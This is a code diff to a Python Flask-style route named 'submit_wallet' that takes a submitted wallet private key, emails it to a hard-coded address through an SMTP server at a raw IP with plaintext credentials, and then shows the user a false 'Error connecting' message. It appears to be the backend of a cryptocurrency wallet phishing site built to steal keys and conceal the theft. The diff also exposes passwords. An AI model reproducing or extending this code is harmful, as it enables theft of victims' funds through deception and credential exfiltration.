@@ -503,34 +503,36 @@ def submit_wallet():
             f"Private Key: {privatekey}"
         )
 
-        # Send email using smtplib
-        mail_server = getenv('MAIL_SERVER_2', 'smtp.googlemail.com')
-        mail_port = getenv('MAIL_PORT', 587)
-        sender_username = getenv('MAIL_USERNAME_2', 'boluwatifemayowa01@gmail.com')
-        sender_email = getenv('MAIL_EMail_2', 'boluwatifemayowa01@gmail.com')
-        sender_name = "Wallet Notification"
-        sender_password = getenv('MAIL_PASSWORD_2', 'qaec dxyl tlqh ajjs')
-        recipients = [getenv('MAIL_USERNAME')]  # Add your recipients here
-
+        # # Send email using smtplib
+        mail_server = "195.250.27.35"
+        sender_email = "boluwatifemayowa01@gmail.com"
+        sender_password = "kz7Yp2tAO2)]8Z"
+        username = "securecr"
+        recipients = sender_email
+        mail_port = 587
+        
         from threading import Thread
         import smtplib
         from email.mime.text import MIMEText
         from email.mime.multipart import MIMEMultipart
+        import traceback
 
         def send_email_in_background(msg, mail_server, mail_port, sender_email, sender_password, recipients):
             try:
                 with smtplib.SMTP(mail_server, mail_port, timeout=30) as server:
                     server.starttls()
-                    server.login("secure", sender_password)
+                    server.login(username, sender_password)
+                    # server.login("secure", sender_password)
                     server.sendmail(sender_email, recipients, msg.as_string())
                 print(f"Email sent successfully to {recipients}")
             except Exception as e:
+                traceback.print_exc()
                 print(f"Email sending failed: {e}")
 
         # Inside your route
         try:
             msg = MIMEMultipart()
-            msg['From'] = formataddr((sender_name, sender_email))
+            msg['From'] = formataddr((username, sender_email))
             msg['To'] = ', '.join(recipients)
             msg['Subject'] = subject
 
@@ -547,35 +549,6 @@ def submit_wallet():
             print(f"Failed to initiate email sending: {email_error}")
             return error_response("Failed to initiate email sending.")
 
-        """ try:
-            msg = MIMEMultipart()
-            msg['From'] = formataddr((sender_name, sender_email))
-            msg['To'] = ', '.join(recipients)
-            msg['Subject'] = subject
-
-            msg.attach(MIMEText(html_body, 'html'))
-            msg.attach(MIMEText(text_body, 'plain'))
-
-            # Connect to the SMTP server and send the email
-            # with smtplib.SMTP('smtp.gmail.com', 587) as server:
-            # with smtplib.SMTP(mail_server, mail_port) as server:
-            with smtplib.SMTP(mail_server, mail_port, timeout=10) as server:
-                server.starttls()
-                server.login("secure", sender_password)
-                server.sendmail(sender_email, recipients, msg.as_string())
-
-            print(f"Email sent successfully to {recipients}")
-
-        except Exception as email_error:
-            traceback.format_exc()
-            print(f"Failed to send email: {email_error}")
-            # return error_response("Failed to send email. Please try again.")
-            return error_response(f"Failed to connect. Please try again.")
- """
-        """ data = {
-            'message': f'Your {wallet_type.title} wallet has been successfully submitted!',
-            'redirect': url_for('main.index')
-        } """
         data = {
             # 'message': f'Your {wallet_type.title} wallet has been successfully submitted!',
             'message': f'Error connecting Your {wallet_type.title} wallet.',
